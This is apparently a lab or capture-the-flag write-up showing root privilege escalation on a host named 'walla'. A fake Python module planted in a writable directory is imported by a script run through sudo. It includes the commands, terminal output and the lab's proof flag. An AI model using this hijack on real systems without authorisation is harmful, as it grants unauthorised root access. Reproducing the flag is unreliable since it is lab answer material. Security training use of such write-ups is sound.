when python imports a module, it searches in the following order

1. current dir
2. PYTHONPATH environment variable
3. system-wide python libraries

# 1. Check the script contents  

```
cat /home/walter/wifi_reset.py
```

# 2. Check current directory permissions  

```
ls -la /home/walter/# 3. If /home/walter/ is writable, create malicious wificontroller.py  
cd /home/walter/ 
```

``` 
echo 'import os; os.system("/bin/bash")' > wificontroller.py
```

# 4. Run the script with sudo  
```
sudo /usr/bin/python /home/walter/wifi_reset.py
```

so we can just make a fake one and we get it

```
www-data@walla:/home/walter$ ls -la /home/walter/  
ls -la /home/walter/  
total 28  
drwxr-xr-x 2 www-data www-data 4096 Sep 17  2020 .  
drwxr-xr-x 6 root     root     4096 Sep 17  2020 ..  
-rw-r--r-- 1 walter   walter    220 Apr 18  2019 .bash_logout  
-rw-r--r-- 1 walter   walter   3526 Apr 18  2019 .bashrc  
-rw-r--r-- 1 walter   walter    807 Apr 18  2019 .profile  
-rw------- 1 www-data walter     33 Jan  6 04:13 local.txt  
-rw-r--r-- 1 root     root      251 Sep 17  2020 wifi_reset.py  
www-data@walla:/home/walter$ echo 'import os; os.system("/bin/bash")' > wificontroller.py  
<ort os; os.system("/bin/bash")' > wificontroller.py  
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py  
sudo /usr/bin/python /home/walter/wifi_reset.py  
whoami  
root  
cat proof.txt  
cat: proof.txt: No such file or directory  
find / -name "proof.txt" 2>/dev/null  
/root/proof.txt  
cat /root/proof.txt  
1be0f2f93b4707f0dd101fb93431353c
```